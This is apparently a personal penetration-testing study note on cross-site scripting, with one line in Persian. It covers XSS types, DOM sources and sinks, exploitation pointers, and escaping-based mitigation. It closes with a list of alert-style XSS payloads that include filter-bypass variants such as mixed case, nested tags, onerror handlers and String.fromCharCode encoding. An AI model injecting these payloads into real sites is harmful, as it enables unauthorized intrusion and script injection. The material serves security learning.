# XSS

##
- بعد از تزریق کد اسکریپ، باید به page source code رفته تا اثر تزریق را در صفحه ببینیم، تا رفتار سرور و متعاقبا نحوه bypass آن را متوجه شویم

## Types
- Reflected
- Stored
- DOM Based
  - Nothing send to server (check with Burp), instead use both Javascript functions types simultaneously:
    - source
      - ```?name=alireza => document.url()```
    - sink 
      -  ```getElementById()```
      - ```document.write()```

## Exploitation
- Session Hijacking (SEC542-4)
- Fake Page (SEC542-4)
- [BeEF](../Tools/beef.md)

## Mitigation
- Minimize the usage of user input on html
- Escape any untrusted input before inserting it into the page
  - ```&``` => ```&amp;```
  - ```<``` => ```&lt;```
  - ```>``` => ```&gt;```
  - ```"``` => ```&quot;```
  - ```'``` => ```&#x27;```
  - ```/``` => ```&#x2F;```
- [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 

## Payloads
```Javascript
a'"><script>alert(888)</script>
a"><script>alert(888)</script>
</title><script>alert(888)</script>
'; alert(888)'//
%27;+alert(888);//
a<script>alert(888)</script>
a<SCript>alert(888)</SCript>
a<scri<script>pt>alert(888)</scri</script>pt>
a<img src='aaa' onerror='alert(888)'/>
a<script>prompt(888)</script>
a<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
a";alert(888);//
a";alert(888);"
a';alert(888);//
a';alert(888);'
/"><script>alert(888)</script>
```
  
